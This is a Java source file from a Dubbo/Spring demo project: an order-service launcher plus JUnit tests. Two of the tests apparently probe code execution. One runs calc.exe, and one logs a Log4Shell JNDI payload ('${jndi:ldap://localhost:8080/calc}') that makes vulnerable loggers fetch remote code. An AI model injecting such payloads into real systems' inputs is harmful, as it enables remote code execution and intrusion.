package one.zpq;

import java.io.IOException;

import org.apache.dubbo.rpc.service.EchoService;
import org.junit.Test;
import org.springframework.context.ApplicationContext;
import org.springframework.context.support.ClassPathXmlApplicationContext;

import lombok.extern.slf4j.Slf4j;
import one.zpq.service.IUserService;
import one.zpq.service.OrderServiceImpl;

/**
 * TODO
 *
 * @author zhangchaopei
 * @version 1.0
 * @date 2020-9-19 15:34
 */
@Slf4j
public class OrderApp {
    public static void main(String[] args) throws IOException {
        ApplicationContext context = new ClassPathXmlApplicationContext("context.xml");
        System.out.println("Started");
        OrderServiceImpl orderService = context.getBean(OrderServiceImpl.class);
        testEchoService(context.getBean(IUserService.class));
        orderService.listUsers();



        System.in.read();
    }

    private static void testEchoService(Object service) {
        if (!(service instanceof EchoService))
            return;
        Object echoResult = ((EchoService)service).$echo("ok");
        log.info("echoTest-rsp:{}",echoResult);
        assert(echoResult.equals("ok"));
    }

    @Test
    public void testAddUsers() throws IOException {
        ApplicationContext context = new ClassPathXmlApplicationContext("context.xml");
        System.out.println("Started");
        OrderServiceImpl orderService = context.getBean(OrderServiceImpl.class);
        orderService.addUsers();
        System.in.read();
    }

    @Test
    public void testExecCalcExe() throws IOException {
        Runtime.getRuntime().exec("calc.exe");
    }
    @Test
    public void testExecCalcExe2() throws IOException {
       String info ="${jndi:ldap://localhost:8080/calc}";
       log.error(info);
    }

}
